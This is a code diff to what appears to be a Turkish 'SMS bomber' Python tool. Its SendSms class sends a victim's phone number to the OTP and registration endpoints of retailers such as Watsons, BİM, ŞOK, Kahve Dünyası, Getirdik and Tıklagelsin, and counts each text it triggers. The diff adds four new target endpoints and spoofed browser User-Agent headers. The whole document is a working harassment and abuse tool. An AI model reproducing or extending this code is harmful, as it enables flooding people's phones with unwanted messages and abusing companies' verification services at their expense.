@@ -141,20 +141,20 @@ class SendSms():
         	"token_type": "register_token"
         })
         if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-            return(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kahvedunyasi.com")
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kahvedunyasi.com")
             self.adet += 1
         else:
-            return(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kahvedunyasi.com")
         
 
     #watsons.com.tr--sms
-    def wasons(self):    
+    def watsons(self):    
         watsons = requests.post("https://www.watsons.com.tr/Customer/VerifyPhoneNumber", data={
         	"phoneNumber": self.phone,
         	"email": f"{self.random_mail}@gmail.com",
         	"isLogin": "false",
         	"getCustomerPhone": "false"
-        })
+        }, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"})
         if watsons.json()["Success"] == True:
             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
             self.adet += 1
@@ -352,3 +352,53 @@ class SendSms():
             self.adet += 1
         else:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> istegelsin.com")
+    
+    
+    #bim--sms
+    def bim(self):
+        bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
+        if bim.status_code == 200:
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.com")
+            self.adet += 1
+        else:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.com")
+            
+        
+    #getirdik.com--sms
+    def getirdik(self):
+        headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"}
+        data = {"Tp": "CreateQuery", "Var1": "Memati", "Var2": "Bas", "Var3": self.phone, "Var4": f"{self.random_mail}@gmail.com", "Var5": "31ABC..abc31", "Var6": "31ABC..abc31", "Var7": "1"}
+        getirdik = requests.post("https://test2.getirdik.com.tr:443/PProfile",  headers=headers, data=data)
+        if getirdik.status_code == 200:
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> getirdik.com")
+            self.adet += 1
+        else:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> getirdik.com")
+    
+    
+    #ceptesok.com--sms--zaman-1dk
+    def sok(self):
+        json={"mobile_number": self.phone, "token_type": "register_token"}
+        sok = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json=json)
+        if len(sok.json()["meta"]["messages"]["error"]) == 0:
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ceptesok.com")
+            self.adet += 1
+        else:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ceptesok.com")
+            
+    
+    #tiklagelsin.com--sms
+    def tiklagelsin(self):
+        json={"operationName": "GENERATE_OTP", 
+                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
+                    "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
+                                "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
+                                "phone": self.phone
+                                }
+                    }
+        tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
+        if tiklagelsin.json()["data"]["generateOtp"] == True:
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> tiklagelsin.com")
+            self.adet += 1
+        else:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> tiklagelsin.com")
